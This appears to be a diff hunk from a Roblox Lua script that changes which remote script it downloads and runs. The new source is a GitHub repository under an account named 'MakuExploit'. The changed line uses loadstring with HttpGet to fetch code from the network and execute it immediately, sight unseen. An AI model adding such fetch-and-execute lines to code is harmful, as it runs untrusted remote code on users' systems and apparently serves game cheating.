@@ -144,7 +144,7 @@ task.delay(7.5, function()
                 msg2:Destroy()
                 -- Execute your custom loader first
                 -- Then execute the 3in1 script
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/main/3in1"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/BackUp/refs/heads/main/Backup"))()
             end)
         end)
     end)
